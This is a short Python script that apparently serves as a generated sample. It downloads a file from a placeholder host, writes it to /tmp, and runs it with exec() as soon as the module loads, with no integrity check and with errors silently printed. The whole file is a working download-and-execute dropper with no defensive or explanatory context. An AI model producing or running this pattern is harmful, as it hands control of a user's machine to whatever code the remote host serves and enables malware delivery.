import urllib.request
import os

def fetch_code(url):
    with urllib.request.urlopen(url) as response:
        return response.read().decode()

def store_code_to_file(filepath, code):
    with open(filepath, "w") as f:
        f.write(code)

def read_code_from_file(filepath):
    with open(filepath, "r") as f:
        return f.read()

def exec_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-63.com/script.py"
    local_file = "/tmp/script63.py"

    code = fetch_code(random_url)
    store_code_to_file(local_file, code)

    code_to_execute = read_code_from_file(local_file)
    exec_code(code_to_execute)

main()
